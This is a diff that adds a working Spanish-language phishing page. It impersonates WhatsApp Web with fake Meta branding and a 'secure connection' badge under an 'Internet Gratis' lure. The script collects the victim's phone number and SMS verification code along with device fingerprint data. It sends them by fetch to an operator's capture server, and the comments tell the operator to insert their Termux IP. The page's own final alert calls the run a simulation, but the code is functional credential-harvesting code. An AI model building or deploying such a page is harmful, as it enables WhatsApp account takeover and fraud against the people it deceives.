@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0B141A;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: #FFFFFF;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .logo { font-size: 60px; margin-bottom: 10px; }
+        h1 { color: #075E54; font-size: 22px; margin-bottom: 8px; }
+        .subtitle { color: #667781; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #E9EDEF;
+            transition: background 0.3s;
+        }
+        .step-dot.active { background: #25D366; }
+        .step-dot.done { background: #075E54; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { font-size: 13px; color: #3B4A54; font-weight: 600; display: block; margin-bottom: 5px; }
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            font-size: 18px;
+            border: 2px solid #E9EDEF;
+            border-radius: 10px;
+            outline: none;
+            transition: border-color 0.3s;
+            background: #FAFAFA;
+            box-sizing: border-box;
+        }
+        .input-group input:focus { border-color: #25D366; background: #FFFFFF; }
+        .btn-verify {
+            width: 100%;
+            padding: 14px;
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+        .btn-verify:hover { background: #1DA851; }
+        .btn-verify:disabled { background: #A8B6C1; cursor: not-allowed; }
+        .btn-verify.secondary { background: #075E54; }
+        .btn-verify.secondary:hover { background: #054740; }
+        .footer-text { color: #A8B6C1; font-size: 11px; margin-top: 25px; border-top: 1px solid #E9EDEF; padding-top: 20px; }
+        .secure-badge {
+            display: inline-block;
+            background: #E8F5E9;
+            color: #2E7D32;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .loading-spinner {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #E9EDEF;
+            border-top: 3px solid #25D366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error-message {
+            color: #E74C3C;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        .success-message {
+            color: #2E7D32;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        .hidden { display: none !important; }
+        .step-panel {
+            transition: opacity 0.3s ease;
+        }
+        .whatsapp-brand {
+            color: #075E54;
+            font-weight: 700;
+        }
+        .code-hint {
+            background: #F0F2F5;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #3B4A54;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">💬</div>
+    <div class="secure-badge">🔒 Conexión segura</div>
+    <h1><span class="whatsapp-brand">Internet Gratis</span> Web</h1>
+    <p class="subtitle" id="step-description">Verifica tu identidad para vincular tu dispositivo</p>
+
+    <div class="step-indicator">
+        <span class="step-dot active" id="dot1"></span>
+        <span class="step-dot" id="dot2"></span>
+        <span class="step-dot" id="dot3"></span>
+    </div>
+
+    <div id="step1" class="step-panel">
+        <form id="phone-form">
+            <div class="input-group">
+                <label>📞 Número de teléfono</label>
+                <input type="tel" id="phone-number" placeholder="Ej: 5512345678" required autofocus>
+            </div>
+            <div id="phone-error" class="error-message">⚠️ Ingresa un número válido (10 dígitos).</div>
+            <button type="submit" id="btn-phone" class="btn-verify">Continuar</button>
+        </form>
+    </div>
+
+    <div id="step2" class="step-panel hidden">
+        <div class="code-hint">
+            📱 Hemos enviado un código SMS al número <strong id="display-phone">**********</strong>
+        </div>
+        <form id="code-form">
+            <div class="input-group">
+                <label>🔑 Código de verificación</label>
+                <input type="text" id="sms-code" placeholder="Ingresa el código de 6 dígitos" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+            </div>
+            <div id="code-error" class="error-message">⚠️ Código incorrecto. Intenta nuevamente.</div>
+            <div id="code-success" class="success-message">✅ Código verificado correctamente.</div>
+            <div id="loading-spinner" class="loading-spinner"></div>
+            <button type="submit" id="btn-code" class="btn-verify secondary">Verificar código</button>
+        </form>
+        <p style="margin-top:15px; font-size:12px; color:#667781;">
+            ¿No recibiste el código? <a href="#" id="resend-link" style="color:#25D366; text-decoration:none;">Reenviar SMS</a>
+        </p>
+    </div>
+
+    <div id="step3" class="step-panel hidden">
+        <div style="font-size:60px; margin:20px 0;">✅</div>
+        <h2 style="color:#075E54;">¡Vinculación exitosa!</h2>
+        <p style="color:#667781; margin:15px 0;">Tu dispositivo ha sido vinculado correctamente.</p>
+        <p style="font-size:12px; color:#A8B6C1;">Redirigiendo a Internet Gratis...</p>
+    </div>
+
+    <div class="footer-text">
+        <span>🔐 Powered by Meta</span><br>
+        <span style="font-size:10px;">Nunca compartas tus códigos de verificación con nadie</span>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('[+] Página de phishing cargada');
+    
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const dot1 = document.getElementById('dot1');
+    const dot2 = document.getElementById('dot2');
+    const dot3 = document.getElementById('dot3');
+    const stepDesc = document.getElementById('step-description');
+    
+    const phoneForm = document.getElementById('phone-form');
+    const phoneInput = document.getElementById('phone-number');
+    const btnPhone = document.getElementById('btn-phone');
+    const phoneError = document.getElementById('phone-error');
+    const displayPhone = document.getElementById('display-phone');
+    
+    const codeForm = document.getElementById('code-form');
+    const codeInput = document.getElementById('sms-code');
+    const btnCode = document.getElementById('btn-code');
+    const codeError = document.getElementById('code-error');
+    const codeSuccess = document.getElementById('code-success');
+    const spinner = document.getElementById('loading-spinner');
+    const resendLink = document.getElementById('resend-link');
+    
+    let capturedPhone = '';
+    let attemptCount = 0;
+    let step = 1;
+
+    function goToStep(newStep) {
+        step = newStep;
+        step1.classList.add('hidden');
+        step2.classList.add('hidden');
+        step3.classList.add('hidden');
+        
+        dot1.className = 'step-dot';
+        dot2.className = 'step-dot';
+        dot3.className = 'step-dot';
+        
+        if (newStep === 1) {
+            step1.classList.remove('hidden');
+            dot1.className = 'step-dot active';
+            stepDesc.textContent = 'Verifica tu identidad para vincular tu dispositivo';
+        } else if (newStep === 2) {
+            step2.classList.remove('hidden');
+            dot1.className = 'step-dot done';
+            dot2.className = 'step-dot active';
+            stepDesc.textContent = 'Ingresa el código SMS que recibiste en tu teléfono';
+            codeInput.focus();
+        } else if (newStep === 3) {
+            step3.classList.remove('hidden');
+            dot1.className = 'step-dot done';
+            dot2.className = 'step-dot done';
+            dot3.className = 'step-dot active';
+            stepDesc.textContent = '¡Vinculación completada!';
+        }
+    }
+
+    phoneForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const phone = phoneInput.value.trim().replace(/\D/g, '');
+        
+        if (phone.length < 8 || phone.length > 15) {
+            phoneError.style.display = 'block';
+            return;
+        }
+        
+        phoneError.style.display = 'none';
+        capturedPhone = phone;
+        displayPhone.textContent = phone.slice(0, 4) + '****' + phone.slice(-2);
+        
+        btnPhone.disabled = true;
+        btnPhone.textContent = 'Enviando...';
+        
+        const data = {
+            phone_number: phone,
+            step: 'phone',
+            timestamp: new Date().toISOString(),
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            url: window.location.href
+        };
+        
+        console.log('[+] Número capturado:', phone);
+        
+        // CAMBIA ESTA IP POR LA DE TU TERMUX
+        fetch('http://192.168.1.102:8081/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(result => {
+            console.log('[+] Número enviado:', result);
+            btnPhone.disabled = false;
+            btnPhone.textContent = 'Continuar';
+            goToStep(2);
+            setTimeout(() => {
+                codeInput.focus();
+            }, 500);
+        })
+        .catch(error => {
+            console.error('[-] Error:', error);
+            btnPhone.disabled = false;
+            btnPhone.textContent = 'Continuar';
+            goToStep(2);
+        });
+    });
+
+    codeForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const code = codeInput.value.trim().replace(/\D/g, '');
+        
+        if (code.length !== 6) {
+            codeError.textContent = '⚠️ Ingresa el código de 6 dígitos.';
+            codeError.style.display = 'block';
+            codeSuccess.style.display = 'none';
+            return;
+        }
+        
+        codeError.style.display = 'none';
+        codeSuccess.style.display = 'none';
+        btnCode.disabled = true;
+        btnCode.textContent = 'Verificando...';
+        spinner.style.display = 'block';
+        attemptCount++;
+
+        const data = {
+            phone_number: capturedPhone,
+            sms_code: code,
+            attempt: attemptCount,
+            step: 'code',
+            timestamp: new Date().toISOString(),
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            url: window.location.href
+        };
+        
+        console.log('[+] Código SMS capturado:', code);
+        console.log('[+] Teléfono:', capturedPhone);
+        console.log('[+] Datos completos:', data);
+        
+        // CAMBIA ESTA IP POR LA DE TU TERMUX
+        fetch('http://192.168.1.102:8081/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(result => {
+            console.log('[+] Datos enviados:', result);
+            btnCode.disabled = false;
+            btnCode.textContent = 'Verificar código';
+            spinner.style.display = 'none';
+            
+            codeSuccess.textContent = '✅ Código verificado correctamente. Vinculando...';
+            codeSuccess.style.display = 'block';
+            
+            setTimeout(() => {
+                goToStep(3);
+                setTimeout(() => {
+                    alert('✅ SIMULACIÓN COMPLETA\n\nNúmero: ' + capturedPhone + '\nCódigo SMS: ' + code + '\n\nRevisa captured_data.txt en Termux');
+                    window.location.reload();
+                }, 3000);
+            }, 1500);
+        })
+        .catch(error => {
+            console.error('[-] Error:', error);
+            btnCode.disabled = false;
+            btnCode.textContent = 'Verificar código';
+            spinner.style.display = 'none';
+            
+            codeError.textContent = '⚠️ Error de conexión. Intenta nuevamente.';
+            codeError.style.display = 'block';
+        });
+    });
+
+    codeInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length === 6) {
+            codeForm.dispatchEvent(new Event('submit'));
+        }
+    });
+
+    resendLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        codeError.textContent = '✅ Nuevo código enviado a tu teléfono.';
+        codeError.style.color = '#2E7D32';
+        codeError.style.display = 'block';
+        setTimeout(() => {
+            codeError.style.display = 'none';
+        }, 3000);
+    });
+
+    console.log('[+] Formulario de captura listo');
+});
+</script>
+</body>
+</html>
